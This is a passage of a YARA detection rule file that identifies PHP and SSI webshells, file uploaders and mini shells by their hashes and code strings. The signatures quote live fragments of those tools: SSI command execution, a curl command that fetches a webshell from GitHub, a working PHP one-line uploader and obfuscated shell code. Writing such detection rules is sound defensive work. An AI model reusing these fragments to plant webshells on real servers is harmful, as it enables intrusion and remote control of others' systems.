      $s6 = "xK3FjZHFxMy9IbDlDOGFlR1RTbmtvL1lZR1JpSTZGRlNCdFFNWEphT2ExeC9qaWdVc29pYlNDSjNmb1d" fullword ascii /* base64 encoded string '+qcdqq3/Hl9C8aeGTSnko/YYGRiI6FFSBtQMXJaOa1x/jigUsoibSCJ3foW' */
      $s7 = "ZMExEcjRpeXhjS0Q2ck94b3lCUFJ3RlBJeFR3Y0c1ckMxMlJkZWM1UjFGaGFDKzdHb3M2MHE5WThBT0x" fullword ascii /* base64 encoded string '0LDr4iyxcKD6rOxoyBPRwFPIxTwcG5rC12Rdec5R1FhaC+7Gos60q9Y8AOL' */
      $s8 = "Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/" fullword ascii
      $s9 = "raHY0OEJ5RGVxWis1VC9kems0Z09sWDVMK0ZqMktTdTVtempmTkZSaDRuWGR2UEhjclY1TllhdFljazM" fullword ascii /* base64 encoded string 'hv48ByDeqZ+5T/dzk4gOlX5L+Fj2KSu5mzjfNFRh4nXdvPHcrV5NYatYck3' */
      $s10 = "TempEd21LeG9YUmxPcy91MEV5RXlrbExTOHp3b0dRL3crR01xRzgvQURXWk9UNElmQjEwVldWOTN1QlF" fullword ascii /* base64 encoded string 'zjDwmKxoXRlOs/u0EyEyklLS8zwoGQ/w+GMqG8/ADWZOT4IfB10VWV93uBQ' */
      $s11 = "iT1Z5NFZmVUZYOUxXU21iMkxMZDNXTUNsUlRUNTc4cTM0cmdVbWczWnBhc21iVEVsQnVJNFpkVHJSTzl" fullword ascii /* base64 encoded string 'OVy4VfUFX9LWSmb2LLd3WMClRTT578q34rgUmg3ZpasmbTElBuI4ZdTrRO9' */
      $s12 = "kRUNwd01oSFJweGhIUU5DV3B4RHVrUCtxcFQvdnMzMGY5ZWl2QVVFVkFCMDMzeWlRUkpBQ1FLdEpxZG5" fullword ascii /* base64 encoded string 'ECpwMhHRpxhHQNCWpxDukP+qpT/vs30f9eivAUEVAB033yiQRJACQKtJqdn' */
      $s13 = "3YXJUcmdlUnJuYkFaTGh1bEtvOC9tc1pqS2s5anhLMnFUcFNnTzFRUnRoSWp1dVV3Q2ZjOWk2MHp0SDZ" fullword ascii /* base64 encoded string 'arTrgeRrnbAZLhulKo8/msZjKk9jxK2qTpSgO1QRthIjuuUwCfc9i60ztH6' */
      $s14 = "3UG1ocGxpeXNIREhRUnJScEdHb0dqdEZUTTdUcStlVU1ZUFpwTzNUNDVLclRmemZHbjBCclhsTmpMbWM" fullword ascii /* base64 encoded string 'PmhpliysHDHQRrRpGGoGjtFTM7Tq+eUMYPZpO3T45KrTfzfGn0BrXlNjLmc' */
      $s15 = "yZXNTQnZ2aFIyRUNreXdvd21vTFk5RGpFdE9VSEt2SE9yNSt0cmdTQjJ6c242YlU1YUNkRkRNeis5eUR" fullword ascii /* base64 encoded string 'esSBvvhR2ECkywowmoLY9DjEtOUHKvHOr5+trgSB2zsn6bU5aCdFDMz+9yD' */
      $s16 = "ydEtvc2tOaXQ3blowK2crcVB6V3l3bVZEeTdqNE81NzQrRHZBazNjMDRkY2tNd1lxWDJGeTNhK25GUE1" fullword ascii /* base64 encoded string 'tKoskNit7nZ0+g+qPzWywmVDy7j4O574+DvAk3c04dckMwYqX2Fy3a+nFPM' */
      $s17 = "WRllnTUxlZk1SMjNWNWhWZGp0cklnc1A4a2tlNndFbFN5bDVMUXYvUEJEbjJpTzNOSVR0Z1B6elQ2emt" fullword ascii /* base64 encoded string 'FYgMLefMR23V5hVdjtrIgsP8kke6wElSyl5LQv/PBDn2iO3NITtgPzzT6zk' */
      $s18 = "yWC9Dbis1akRac1dUZzMzSm9pLy9mOVRZTkltRzVLQ1JndE1KVnhUQzl0R2xCVUhGeTgrK0hyVXM5OW9" fullword ascii /* base64 encoded string 'X/Cn+5jDZsWTg33Joi//f9TYNImG5KCRgtMJVxTC9tGlBUHFy8++HrUs99o' */
      $s19 = "FZXQ1VHBjZG1kT1NROENQZUtVbE1xYWEyeWpQWFVNeSt6RHlqSGNpalBndWVCUVB0bVNhK3VjSTN5T3Z" fullword ascii /* base64 encoded string 'et5TpcdmdOSQ8CPeKUlMqaa2yjPXUMy+zDyjHcijPgueBQPtmSa+ucI3yOv' */
      $s20 = "CWmRKaldoemxjd3lJUFRXdXdlektaQVVtQ1k5Z0ZkRlpkOW45N3ZMaWlad3hMSGhtTE9abTdodllSeit" fullword ascii /* base64 encoded string 'ZdJjWhzlcwyIPTWuwezKZAUmCY9gFdFZd9n97vLiiZwxLHhmLOZm7hvYRz+' */
   condition:
      uint16(0) == 0x3f3c and filesize < 4000KB and
      8 of them
}

rule shell_digicorp_project {
   meta:
      description = "Shell Backdoor by DigiCorp Project"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "a051fe0ea9854e37400a196a6d4701f80b3929ecdd38381cdfabf4e5a3232671"
   strings:
      $s1 = "$uk45 = \"==Q/zXlG/pT8L8w/43ANvCvpPTxH4qpCdBBRIt795BkKUq2WroouOjZYWq3K5cqxmiA90gq77bOkjqiKjOuUDWuLnpcO+/QbSgKjF6u+NyB9sPv4Xv3Hkb" ascii
      $s2 = "2YrqE/VlGulKMjNqavys/jZC0hirTzzZFUGETl2A108dVWfRtJAKKrhyh95wGAc0H9AOEN2qQ3ic7+H3iGA8fXwQE/xyMfqZOZG5FMSubnlB9HK/fDkF0KELeT0HYNhY" ascii
      $s3 = "5ojv80aroKjZ8yUNCRsZPkyIq1TzwKPI/iRYfU/Qzwgflrrd5/HOVRqX/+plv/x0s85IYp3Gs6DLlL3Y1U8oJVniKEjG9K99Biekgkipq/rhLSX8VsUNIoMKPPWg9K4G" ascii
      $s4 = "j1O7ZjMEn5n2izeELOgvwNyA1Q0Qiku5xw3NdCRC0NDQwx+WAHO70s982kDWLwnUoZScbQumM8OnZ59Ubdu2A1La/B+gyq3NLYA6HrEu9GlzOMhROBdGJVqFmzc8vzKq" ascii
      $s5 = "AzvFbMcpC+DgRgXYEYRHMvCr1loRy6geTE2gds1SHCvXChEIZgp5BCyn1ajvdFIa0NL2nI4F41NxAoDpYnMv8mYrsATZ9GzRGJTtk3RI3BfJMIPdfqfWvVtZBaOFIJJY" ascii
      $s6 = "ZlknnH2A/7ZVTvrFWNH3Q5Em2xArLFUpc1Ww/hk0vF8+Jr89lhqDHEIPxKAgBY4Lyx4JFi4SQ3l9EdJ+62+Pl8NyemXa6zoY7btmmw8usJIdrat+wIdYmoUutU6Et3GB" ascii
      $s7 = "eyep67A+COeSDx5yMnOMB3I3BNHL1juD1jLgTPonS9TEULLcr4BPJC/sr4CWid7xh6hWlR3kZbZ0rKV79Yrm3DdKQ5mpXI7Jb7mrast75MPJAn/qBzPLlsydP797LRfA" ascii
      $s8 = "WSvoVtmpHCR9TZ5ZBpemgbHdbF5vgbPVMlSerFVLNts1N7sQU8pUYqNhJ9jeULJOf4J5ryeQ2pkf0WXpJw31CjWzpg55kix6GNVndzl9fbfIquHzclwJuqKadoXsYhNr" ascii
      $s9 = "5LIDgtTSND0j5KUS+3S4G9MtxdTVuvPRYug0ZPe0kTWZRBfU7MI4yiAUCuL/hvCpBAU34ckshESzFkHxqtkk3612xsmlCoMaihAnVs2bHpZdAn84tslcM3B973TAS6R3" ascii
      $s10 = "yXTMpr3NyOKqmP+BnLQe80gWX8JHNTh8UM/w3wcbKGL1783FJo7Rq4r40H2634r3v4rWe4rVm4rUiij65TUEPFRg/CGJKsUzcXk1OCrMxFcJVMlVWVyWSU22ShYaJ1mY" ascii
      $s11 = "X3u7TmptleML4scQeAdYBIIzbFOtlqjJPvvqVydtfoxh/FRLHo8e+Aj3GOiLGGdA8RS0q2nRlmVW7Yo7/f1lO1BpAIvXytpG1CJOeq907hELCkcItgs8vffnwzZ1ae8P" ascii
      $s12 = "33YPgZLOgwZ/+S5/gHbsARPJ98wrhP4aNfhSfExBMu9LQjHW/NPed97er/FELerRN05PwlbsIHHleypewQzbcaIl3X3mU5WrIxaa8E3BtgoTk13dg1Ek1+S9w4E/j3i9" ascii
      $s13 = "yOEwhseiq0Jp2FNow8tJfuibGVAsRSfYuZzMJto+rfmoCm4FR1B8uFG5ixKLFBe9xbFqIW3+wd28uKjsOG2WSW48d2drHt95ndw5Xc2ungmR1vVOjp/d9ug+8chZEqtr" ascii
      $s14 = "9dO547dKRrYSNP8gi61We9daeCro2Pe0NM0zNsPQDZXjC/3Bewv9hJjtTK+/TF7O87eAOzObzfu4Tm6jTFQK0JJBLDVonQTaiWEiwMjWWHJCw0kVLxgegOR0xG8R7kj5" ascii
      $s15 = "SUdBhE3bnKQHaYvJUTaTqplLm65GRzPbCHGmQ5IQlYHVQbEnhejRxmooJhU2XGovkOcm+diRnxPKXl6CpA/UqQMxtfDLGFJBcYMi+PGvgH7GboN7f2vHCiKFm8r3kPLh" ascii
      $s16 = "NBveH4J35XWgSZU+Tkt1lahXTUrk+sjjTPF4qybx1r8FM4QTJfxBoLQ0BUkrAXWJBNaR/NQsISKh+xd4QGAPU2v1+tugh4kgww7v0uyYLOKvkmlIS4bqCKXrbure1bw7" ascii
      $s17 = "u98NuTffTjfj/AfY2d2eHd/+ts0wc/tKe77gJaxV7pH422lVFfUvYZFSPFlpJ+FPLLcipxqVU2oqwZxuIsBsAnQB69SiWvuwGJLrLLugg5Zs9alqgUHribaDvUI7PGt+" ascii
      $s18 = "7Raqc58Vx0rsmxyCFH9uXCyvLaNZUGPXAqN3ByU04bu+naitJ2MvI6ZugQQJbxeujXEYzvkcPSLTwbVqTuYej58rnE99ttbfVq+6afcYfepbaD8Zn8ugg/kXlKI4PVRs" ascii
      $s19 = "4YXCBzrYfu/Efs7JrfpcONWtdVzm3vuLOWgG4FlCMEAZwnlQPAIjP4iW3VpWn7Ylr+xTKknewXpFBvRQqhm9gcVfdQCkOPW8g11nDffNBbC9+MuKrrvKbR7hWYnUWwUE" ascii
      $s20 = "vI285tgESwKrvqoOBPzS8V5fD1L5reajv5XKg0xwuA/inQWotL0q+mipOl2E2EvcjbWiMpd7tVwCiZSfcOBKlo2ooPd48YPWJToGTS2GI4OeDHchyznzadKdgroGIayZ" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule shell_1945 {
   meta:
      description = "1945 Shell by shutdown57 (www.withoutshadow.org) "
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "4ebdd8cc0266f75894a826944bd9f4f03e0b98543dc3e672b31f35bc4e52a234"
      hash2 = "7c9fe9cfe409ec7f431bd80b1413bcf15f9070110be9a285322bc576472a14ab"
   strings:
      $s1 = "$merdeka=\"7b17SuO4syj6N71JfweRbo/hNGyQ8AwkPQkQHloHEiA8untmeXA7hODEQW/izMzvs58qVrblVE/onj3n3rsuMw2JRyqVVyWpJEiVPn5LMl1bM1epPb2vO" ascii
      $s2 = "Di2NZHxExRkUFTP9O8CspSHkqeGfRSRIV7e6xGzOqGrumR3tDNfIrwICIsYvF9gVE8hHXEkZTqxxCJ3OOLVW4zAHgD+pSwWAQdlgQ0q7F5S4EVaTzOnV3Y9TsaUdCHhZ" ascii
      $s3 = "6vLS8UzlT0P0cvxQqJSnCk0Dw1FvwaC0/hT3WLGnihX26kzDwVrvsVrguF1+esQyyzMV+FG36FG+HCZki4kUuh2BVZv47oCTVzApjJcYh/bXHZ8tCUiW5Bnln5hRRKBH" ascii
      $s4 = "1yu4On2wkUSksO59RbayZwkMxxLA1UmxMJPYpYQEXD9DlkwMAcJKDAcXQIur7ZmxORdloGjnkl4KpbE1QmmHZ7LZuP2XqY08wkjMc0cEHC2vKLoyYhwWfyjj6DTMORh4" ascii
      $s5 = "XyAoJM7U0PU1ayhHaTUcm0ebxEmCGZGmZAjRVx6TMK9lQTJW4I0eQEZP47RKKRIyGRc+8pIWqo2eNXVW2X0L4Vr1s9p0cBMLuWy6/TbJDBQ05bpt9JCyvs2J/llVgEbu" ascii
      $s6 = "DooRjtbwn6Rey0T/5H6c81vvmh0nAPrPNsfhGt6Xe1SbXyWoLWqugx8cTzp3GVRXswuWvGYUKO3USpEsHDTWSTt5JyPzl9m70PvgoDTjYc01rrfZhmWHhFYx3sTFxaqX" ascii
      $s7 = "WBOsbxLa6v5Ar0zyQl/w5N8v/TxBRFcX53Cv/T1Ky/gzXr/9PEeaTmpiXZvSaBlnZeMj1CCUJjum61MHou5SmMPVAm8C+td87E1Lp+/XyUm65YB1Kwz6efhJmD+eUkeJ" ascii
      $s8 = "H18VCRXME0epAj4OpLxwj86TQ5ojw+u2IS+LJijlwq1KqtvbZaOhHQTAb7NZ2mBb6lf+ijaCvXbNjZ+bb4A4vdH179toUf9LasrXrgp7Ejg/xn2xN7fRu/4zNQf8COme" ascii
      $s9 = "nTrhjkKBSsiL2eu4/xuwgdrNSlmXi/CMdzk8gnX4Gm30/Xwz7uFA0WpaDTvlJFGdxyo6xFrqxx8FYpUOvS7Ycwdb7LqTljAIsQg9dbURAOPJWkYuI4th5Q9p8fpFNwje" ascii
      $s10 = "YJct4/nryS7x5DXsFgUSWX8/zbE4o2a0nyawwUAx5rwfLfXFUV6JwbinTOvtBnL0e1yV3qdY56sYE5K6C4G2Njd0d3vHcs429krM4IaY1OE2DBlnZViemxpYF9yoQ+9F" ascii
      $s11 = "2JdPPBWE7APsFWAYkOffWetsHBDIWFVaoS/TQlY1NPRna0LEARip0RDx0gUmdt39XhZuB3OFKZk9Yk5lgY1uZD9aoovhb23/6nCmdHoMmhqTE9UfGTd85YkH906ga5Si" ascii
      $s12 = "db/geQg7y4pUsTMPUB6vsnyLcGAeVcrX7wKtR2SoDqCm3L8iyo1dzqU2Elk021jX4mk5nSTpV3pSlHWhfglGNAgiOXHo+oms1oWykYyGcccDZG1lWtbWxnTT95b13C3o" ascii
      $s13 = "$s57_paswot = \"2d00f43f07911355d4151f13925ff292\";//default password : 1945" fullword ascii
      $s14 = "91tlI6Iwd41ShpQNvWem/KpInADaXfnkBibvrIlC0EHNlA33Db1o3MXkkt73KBf7RmqATxKYP2CAhVVm9X/J+YWuAHu1QCkmijWDsDOwEye3N/PNSAJquI0/5hkG/RAV" ascii
      $s15 = "zKs5RWFdAG249cEY21vH9Lvb2r39d4LSFj1h7sGx7bNj2JwqA3E/QgKnrQO+hewhUGM1e+hX6BzZQ81Fo0fkNxW2pZL20fnn1aefnVNOj9xtie2NArcBM++7AZhufaZ/" ascii
      $s16 = "NH2SP4G1D/g84CZ6DhWVLYWQVQx4A5xoNanTbvLqr3WrLXK8+gbC/bK5OjqlU3tEgsY31ntP9jDTMrem93L4towlUzLPylBY0MRIODmS6OG3Fg9u0SDGTNgWxStjtyZQ" ascii
      $s17 = "sEk3zFnWM9lgRY68TaS0EUuZUfcXKFo8Ki9lE1ukNFh5UWGNtEDLJP/vqLUODPMvGxZn0A+C8BGvL775DJdxJmSVWpJCJcIfhfgGM+Kliwd7XtXa/VoOQKKOLqATCJ5f" ascii
      $s18 = "b9ffBl8Uvk44fjV/2eAcLwfXWjdS6vYAbqbX5e8gYJoE37hEqKYFDcW+pTr1jRJCuPwIK/yEz1+JBA2W/kzFPcraVAcsS9RpHE+hEK4fjLa/szsowpjpVWrZArHHfJcu" ascii
      $s19 = "6aUtMybTTr2RAQXfPgk+yx57R3d7p6vZ0vIPUgkvHS1CnAHhKPUGgXv+21BveK1Wl6Avv6B9iDb/SKYaZfhrya3b+k195aGRYpm0cHAzG1Bqob9kM0/QKndNhUNeW+gl" ascii
      $s20 = "jcgTmktQ8JeUKnmrB2NHJS7kGUL6yGch0UNRmBQAcnKyRx/CkYbPL1PEO2pXXES6ksrErBz7c3DMB8c5U6uiKVQnhItnTj+8ZfwMeeRC7TrS9hmp+2dG6eH2LPfjVum9" ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x3c20 ) and filesize < 80KB and ( 8 of them )
      ) or ( all of them )
}

rule shell_NezukaBot {
   meta:
      description = "NezukaBot SSI Webshell"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "e39377bcbfb83e61e00dbd63ab85b0f74c2e675f3b6560f2248781811cb2e61c"
   strings:
      $x1 = "Executed Command : </font><b><font face=\"courier\" id=\"cmd\"><!--#echo var=shl --></font></b></i>" fullword ascii
      $x2 = "document.location.href=\"<!--#echo var=DOCUMENT_NAME -->?\"+\"curl${IFS}-Ls${IFS}raw.githubusercontent.com/AzhariKun/webshell/ma" ascii
      $x3 = "document.location.href=\"<!--#echo var=DOCUMENT_NAME -->?\"+\"curl${IFS}-Ls${IFS}raw.githubusercontent.com/AzhariKun/webshell/ma" ascii
      $x4 = "MySql : <b><!--#exec cmd=\"{test,-e,/usr/bin/mysql}&&{echo,ON}||{echo,OFF}\" --></b>&nbsp;|&nbsp; Wget : <b><!--#exec cmd=\"{tes" ascii
      $x5 = "e,/usr/bin/wget}&&{echo,ON}||{echo,OFF}\" --></b></b>&nbsp;|&nbsp; Curl : <b><!--#exec cmd=\"{test,-e,/usr/bin/curl}&&{echo,ON}|" ascii
      $x6 = "MySql : <b><!--#exec cmd=\"{test,-e,/usr/bin/mysql}&&{echo,ON}||{echo,OFF}\" --></b>&nbsp;|&nbsp; Wget : <b><!--#exec cmd=\"{tes" ascii
      $s7 = "<pre><!--#exec cmd=$shl --></pre>" fullword ascii
      $s8 = "<br><br>System : <b><!--#exec cmd=\"{uname,-nrv}\" --></b>" fullword ascii
      $s9 = "<font> COMMAND : <input type=\"text\" size=\"30\" id=\"command\" class=\"text\" name=\"address1\" style=\"max-width: 100%; max-h" ascii
      $s10 = "<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js\"></script>" fullword ascii
      $s11 = "<!--#config errmsg=\"Function SSI Disabled Command\"-->" fullword ascii
      $s12 = "document.getElementById(\"cmd\").innerHTML = cmd;" fullword ascii
      $s13 = "<br>Current Path : <b><!--#echo var=DOCUMENT_ROOT --></b></i><br><br>" fullword ascii
      $s14 = ";\">uploader</button><br><br>" fullword ascii
      $s15 = "  var cmd = document.getElementById(\"cmd\").innerHTML.split(\"${IFS}\").join(\" \");" fullword ascii
      $s16 = "<!--#else -->" fullword ascii
      $s17 = "<!--#endif -->" fullword ascii
      $s18 = "echo,OFF}\" --></b><br>" fullword ascii
      $s19 = "<!--#set var=\"zero\" value=\"\" -->" fullword ascii
      $s20 = ";\">&nbsp;<button class=\"input\" id=\"gas\" onclick=\"nezcmd();\">execute</button> <button class=\"input\" id=\"gas\" onclick=" ascii
   condition:
      uint16(0) == 0x213c and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule uploader_azzatssins {
   meta:
      description = "File Uploader by Azzatssin's"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "64e19e7b0774e708574769e5a656304bb65687fd17376d680ecd0c343a46bbad"
   strings:
      $s1 = "<?php if(isset($_FILES['azzatssins']['name'])){$name = $_FILES['azzatssins']['name'];$azx = $_FILES['azzatssins']['tmp_name'];@m" ascii
      $s2 = "ove_uploaded_file($azx, $name); echo $name;}else{ echo \"<form method=post enctype=multipart/form-data><input type=file name=azz" ascii
      $s3 = "<?php if(isset($_FILES['azzatssins']['name'])){$name = $_FILES['azzatssins']['name'];$azx = $_FILES['azzatssins']['tmp_name'];@m" ascii
      $s4 = "tssins><input type=submit value='>>'>\";} ?>" fullword ascii
   condition:
      uint16(0) == 0xd8ff and filesize < 20KB and
      3 of them
}

rule shell_0byt3m1n1 {
   meta:
      description = "Mini Shell by ZeroByte.ID"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-01"
      hash1 = "7b730ab8ac42b5dfa4d4e65dd06f8d5e4dde63665bec3a76eb2e9fb0336f569c"
      hash2 = "4500f0420505f3d68460e5e478ba430216a16f193e67df13333bfeff89755095"
      hash3 = "cc99a727ef8620faf56ce9325eaacd558b5130dbb57d8ed313124166d6d71e15"
   strings:
      $s1 = "echo '</table><br /><center>'.$_POST['path'].'<br /><br />';" fullword ascii
      $s2 = "}elseif($_POST['opt'] == 'edit'){" fullword ascii
      $s3 = "}elseif($_POST['type'] == 'file'){" fullword ascii
      $s4 = "echo perms(\"$path/$dir\");" fullword ascii
      $s5 = "echo perms(\"$path/$file\");" fullword ascii
	  $s6 = "echo'<br><center>&copy; 2017 - <a href=\"http://zerobyte.id/\">ZeroByte.ID</a>.</center><br>';?>" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0xd8ff ) and filesize < 100KB and ( all of them )
      ) or ( all of them )
}

rule uploader_Sindbad {
   meta:
      description = "Sindbad~EG File Manager"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "cc99a727ef8620faf56ce9325eaacd558b5130dbb57d8ed313124166d6d71e15"
   strings:
      $s1 = "echo '<br />Sindbad File Manager Version <font color=\"red\">1.0</font>, Coded By <font color=\"red\">Sindbad EG ~ The Terrorist" ascii
      $s2 = "echo '<br />Sindbad File Manager Version <font color=\"red\">1.0</font>, Coded By <font color=\"red\">Sindbad EG ~ The Terrorist" ascii
      $s3 = "<textarea cols=80 rows=20 name=\"src\">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />" fullword ascii
      $s4 = "echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');" fullword ascii
      $s5 = "Permission : <input name=\"perm\" type=\"text\" size=\"4\" value=\"'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'\" />" ascii
      $s6 = "echo '<font color=\"red\">File Upload Error.</font><br />';" fullword ascii
      $s7 = "// FIFO pipe" fullword ascii
      $s8 = "ljohuppm/ofu0mpht0dj%7B/kt%2633%264F%264D0tdsjqu%264F%26311')</script>" fullword ascii
      $s9 = "echo '<font color=\"green\">File Upload Done.</font><br />';" fullword ascii
      $s10 = "echo '<form method=\"POST\">" fullword ascii
      $s11 = "echo '<div id=\"content\"><table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">" fullword ascii
      $s12 = "<td><center><form method=\\\"POST\\\" action=\\\"?option&path=$path\\\">" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule uploader_simpleman {
   meta:
      description = "Simple File Manager"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "d016f4b8298ade74427232b0c43a768d8b08708a3a95142d8255a1fc0b6c2821"
   strings:
      $x1 = " goto XqKQl; Pdrln: BixNK: goto xVvfW; uUvCz: $ZV5BV = \"\\x40\\x72\\145\\161\\165\\151\\x72\\x65\"; goto is2iM; TiO86: goto rzl" ascii
      $s2 = "_GET[\"\\144\\x69\\162\"])) { goto nXRAt; } goto CqaGD; ync6F: $CBxRP = scandir($_SERVER[\"\\104\\x4f\\103\\x55\\x4d\\x45\\116" ascii
      $s3 = "o lW5kn; bzV6t: $qag9p = $_GET[\"\\x64\\x69\\162\"]; goto g3wGR; GdZMk: nXRAt: goto sChFQ; NOtMC: $IaZRO = \"\\100\\151\\156\\14" ascii
      $s4 = "pHKR; } goto uMnGt; XgyOQ: readfile($_GET[\"\\144\\x6f\\x77\\x6e\\154\\157\\141\\x64\"]); goto hiFYY; Obdrk: foreach ($eb51o as " ascii
      $s5 = " goto VuLhu; ba3qP: $Ay1ZD = $QB964 - $LztR2 - 1; goto N14Yf; o5mWg: $MVQ4B = $VdNWK . $QqgvR; goto eLvFC; Eo0Zl: e0oPQ: goto Or" ascii
      $s6 = ": $QB964 = count($BwPeK) - 1; goto roUBW; J9A41: if (!($LztR2 <= $QB964)) { goto GNZed; } goto gl3ZF; a4BUt: exit; goto o5qhH; e" ascii
      $s7 = "Bv: $CBxRP = scandir($_GET[\"\\144\\151\\162\"]); goto ok3Ws; ouA0y: z4_go: goto f_RKQ; bH693: foreach ($xWYvg as $v3hoM) { goto" ascii
      $s8 = "x2e\" && $FYqvS != \"\\x2e\\56\")) { goto uh_3a; } goto IU1w0; U7sJb: closedir($stVxA); goto AUkFu; q9nPb: A16xm($Ia7Nm . \"\\57" ascii
      $s9 = "\\x2f\\x66\\x6f\\156\\164\\x3e\"; goto YEiIr; yLFr0: if (!empty($_POST[\"\\x73\\x65\\x61\\x72\\x63\\150\\137\\146\\151\\154\\145" ascii
      $s10 = "\\x62\\x3e\\105\\x64\\x69\\x74\\145\\x64\\41\\74\\x2f\\x62\\76\\x3c\\57\\x66\\x6f\\156\\x74\\76\"; goto PsIqX; w30Xp: if ($_POST" ascii
      $s11 = "\\57\" . $_POST[\"\\156\\145\\167\\137\\144\\x69\\162\"]; goto pTDZJ; WAzUP: goto MahxP; goto CyDjU; WKo2f: if (!($LztR2 <= $QB9" ascii
      $s12 = "\\144\\x65\\x63\\x6f\\144\\x65\\50\"; goto rK4mL; CDuMW: header(\"\\x43\\157\\x6e\\164\\145\\x6e\\x74\\x2d\\x54\\171\\x70\\145" ascii
      $s13 = "\\151\\162\"]; goto LO9Y4; P_kkP: echo $rwHC9; goto O1k9v; JAFmq: if (isset($_GET[\"\\144\\x69\\x72\"])) { goto TXIeY; } goto ZJ" ascii
      $s14 = "\\x43\\125\\x4d\\105\\x4e\\x54\\137\\x52\\x4f\\x4f\\124\"] . \"\\57\" . $_POST[\"\\x6e\\145\\x77\\x5f\\144\\151\\x72\"]; goto B5" ascii
      $s15 = "64\\151\\162\\x3d\" . $_GET[\"\\x64\\x69\\162\"]; goto dSG5z; VuLhu: foreach ($bmi_c as $v3hoM) { goto Fnl3Y; WEj08: if (file_ex" ascii
      $s16 = "IHGon: if (empty($_POST[\"\\x66\\x6f\\x72\\x5f\\x64\\145\\x6c\"])) { goto b2Dcx; } goto CpjCT; oz78r: if (isset($_GET[\"\\x64\\x" ascii
      $s17 = "lose($A12k0); goto U4RHe; upOid: if (isset($_GET[\"\\x64\\x69\\x72\"])) { goto hQE5F; } goto ttSZj; q2S4r: A6_FD: goto p4GPE; Zz" ascii
      $s18 = "RxQ; zsQS9: $xvhqj[] = trim($L2igI[$n7IRr]); goto aTkN9; mfteG: PAwk5($_GET[\"\\x64\\145\\x6c\"]); goto bfuol; ngPvI: b52zt: got" ascii
      $s19 = " goto JWkGk; JWkGk: } goto tarvp; on9Rz: FZDRH: goto c9gbq; uVZuN: if (empty($_POST[\"\\156\\x5f\\156\\141\\155\\145\"])) { goto" ascii
      $s20 = " k1N6X: if (!isset($_GET[\"\\145\\x64\\151\\x74\"])) { goto VlPfp; } goto o5mWg; AaM6l: function GM9cQ($VjOK1, $h_0S7) { goto M2" ascii
   condition:
      uint16(0) == 0x4947 and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule shell_ucen_haxor {
   meta:
      description = "Mini Shell v.10 by Ucen Haxor"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "16012a64f8892ad3a6f1613c9cbc2c4e4971b1ff3d6206d8e9bd7aea7bed0739"
   strings:
      $s1 = "$Black_Coders = \"8dWXWFw/znzo6jJzI+a7i7chi/UzzqzVabmBBYQocnSS+QPvkRntq/C/0nS6B1Hk/koQ9lC9SUYuVK6UMc/HmMY23IPOOI3TQYHKG+kfIbqLXJ" ascii
      $s2 = "zdHuXrorFCNBN8KpTpK7spOJ+iRg38NJITX+TRcCrXAkXAFfCySKqh1/1VTaeXR6p4+bTyIg7+SpYEYxvzwt4NtAFT1JFjTTSWaUkF9wBiy6Da7UFzv4WoxbgnzHNUcK" ascii
      $s3 = "SABl/XuG4gJBA16aLtsqWwEAenboe0hp54xexhQoZRefWWASfNuBgZ9GssaHNhhSaLLgQKuRdg5nke3ujbogP0cTwLC+CcU/5eitI73aNb3jcCCloxfdgngar6H0P4dQ" ascii
      $s4 = "k0u0PspsUPtrqfrc39Av0MlIKF5omSEsnZRvYUVxRDLRhAbIn8BkMxyJpMaxlsukHQqJbNHSRkvZKLpgTYKLVebmoCHPL/x7LPXyNv9qQam2ojtRDBK2C/zVymnS60fV" ascii
      $s5 = "S0L/JJNVabQOIbinb5sXJYB03YxZY0rWPqbHmfbFcO/40zAFVs+k+PsREJw9Zl8MKNUGZcIjnkZahoTOymYzTDoxMsdc0fPEtUf3imWc+QtztIX7h1FneBFzTRxsvX/z" ascii
      $s6 = "JvmmTA+yBii+ZxzFnVmbXpfFRGk7cwuosCagEuN5eSV5fsWhSATHqmh6ToUUSAILK6N7CKG/ZGelVA4LRfdt8YhNC0gm0VhOVh6eqPFtpQAV4S1nGcABqka0++eDd0wi" ascii
      $s7 = "y623enmFYZfp0YtyRP7Sj9nziJF04SNlPeCislm3fvV5OegNM3oVX5qYtSdadYG7q7U/D+VCDOZ9FOlYUJETUJkDIDSfvDSGba0iIqcYCT3l4qJYxd6D4fnCe+l89HSo" ascii
      $s8 = "TkKo8oUM9UootVPbbGGFule9p8udNiDCzcBTTSLYsrYsExL7v1OnVPXzMMGOur/u1kyce9mtKqS6Mc/DL/7ryEhyLi4/vgzK97noXj6ds41w6SAWzjHXAx98tZjtSUZz" ascii
      $s9 = "ueLE1G2GiBAkXedzGDbEB4wfwbcMHxndIY58RhGi9NDtnjLnqhy6mnFNY8RaxcTAl+iJsnXuZ0luXADl5KTW9fpd7sacDykHhEUSsb1V6AET6ml9/tFtJYQILX2RUT5e" ascii
